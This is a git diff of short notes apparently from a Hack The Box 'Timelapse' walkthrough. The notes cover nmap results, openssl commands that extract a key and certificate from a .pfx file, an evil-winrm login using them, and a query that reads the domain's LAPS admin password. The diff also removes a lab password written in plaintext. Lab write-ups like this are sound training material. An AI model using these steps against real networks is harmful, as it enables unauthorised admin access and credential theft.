@@ -1,4 +1,6 @@
+# Timelapse
 
+## NMAP
 
 ```text
 PORT      STATE SERVICE        REASON
@@ -35,37 +37,29 @@ PORT     STATE    SERVICE           REASON          VERSION
 Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
 ```
 
+## FQDN
+
+```text
 timelapse.htb
 dc1.timelapse.htb
+```
 
+## PKCS cracking
 
-
-
-
-
-
-
-
-
-
-
-
-
-
+```bash
 openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out legacyy_dev_auth.key-enc
 openssl rsa -in legacyy_dev_auth.key-enc -out legacyy_dev_auth.key
 openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out legacyy_dev_auth.crt
- 
- 
- evil-winrm -i $IP -S -k legacyy_dev_auth.key -c legacyy_dev_auth.crt
+```
 
+## evil-winrm connect with key and certificate
 
-
-
-E3R$Q62^12p7PLlC%KWaxuaV
+```bash
+evil-winrm -i $IP -S -k legacyy_dev_auth.key -c legacyy_dev_auth.crt
+```
 
 Get-ADComputer DC01 -property 'ms-mcs-admpwd'
 
+### references
 
-
-https://0xdf.gitlab.io/2018/11/08/powershell-history-file.html
+[oxdf-powershell-history](https://0xdf.gitlab.io/2018/11/08/powershell-history-file.html)
